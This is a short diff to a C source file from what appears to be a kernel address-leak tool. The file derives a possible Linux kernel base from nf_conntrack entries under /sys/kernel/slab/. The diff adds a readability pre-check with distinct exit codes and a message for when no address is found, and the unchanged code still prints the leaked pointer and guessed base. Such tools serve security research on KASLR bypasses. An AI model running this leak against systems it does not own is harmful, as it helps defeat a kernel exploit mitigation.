@@ -16,11 +16,13 @@
 
 #define _GNU_SOURCE
 #include "include/kasld.h"
+#include "include/kasld_internal.h"
 #include <dirent.h>
 #include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 
 unsigned long get_kernel_addr_conntrack() {
   unsigned long addr = 0;
@@ -65,9 +67,16 @@ unsigned long get_kernel_addr_conntrack() {
 }
 
 int main(void) {
+  /* Pre-check: can we access /sys/kernel/slab/? */
+  if (access("/sys/kernel/slab/", R_OK) != 0)
+    return (errno == EACCES || errno == EPERM) ? KASLD_EXIT_NOPERM
+                                               : KASLD_EXIT_UNAVAILABLE;
+
   unsigned long addr = get_kernel_addr_conntrack();
-  if (!addr)
-    return 1;
+  if (!addr) {
+    printf("[-] no kernel address found in sysfs nf_conntrack\n");
+    return 0;
+  }
 
   printf("leaked inet_net struct pointer: %lx\n", addr);
   printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
